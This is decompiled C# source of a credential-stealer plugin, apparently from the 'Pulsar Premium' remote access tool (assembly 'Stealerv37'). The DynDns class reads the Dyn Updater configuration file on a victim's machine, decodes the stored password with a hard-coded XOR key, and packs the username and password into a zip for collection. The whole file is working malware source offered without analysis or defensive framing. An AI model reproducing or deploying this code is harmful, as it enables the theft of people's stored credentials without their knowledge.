// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.DynDns
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Globalization;
using System.IO;

#nullable disable
namespace Intelix.Targets.Applications;

public class DynDns : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = "C:\\ProgramData\\Dyn\\Updater\\config.dyndns";
    if (!File.Exists(path))
      return;
    string[] strArray = File.ReadAllLines(path);
    if (strArray.Length == 0)
      return;
    string entryPath = "Dyn\\Passwords.txt";
    counter.Applications.Add(new Counter.CounterApplications()
    {
      Name = "Dyn",
      Files = {
        $"{path} => {entryPath}"
      }
    });
    zip.AddTextFile(entryPath, $"UserName: {strArray[1].Substring(9)}\r\nPassword: {this.DecryptDynDns(strArray[2].Substring(9))}");
  }

  private string DecryptDynDns(string encrypted)
  {
    string empty = string.Empty;
    for (int startIndex = 0; startIndex < encrypted.Length; startIndex += 2)
      empty += ((char) int.Parse(encrypted.Substring(startIndex, 2), NumberStyles.HexNumber)).ToString();
    char[] charArray = empty.ToCharArray();
    char[] chArray = new char[empty.Length];
    for (int index = 0; index < chArray.Length; ++index)
    {
      try
      {
        int startIndex = 0;
        chArray[index] = (char) ((uint) charArray[index] ^ (uint) Convert.ToChar("t6KzXhCh".Substring(startIndex, 1)));
        int num = (startIndex + 1) % 8;
      }
      catch (Exception ex)
      {
      }
    }
    return new string(chArray);
  }
}
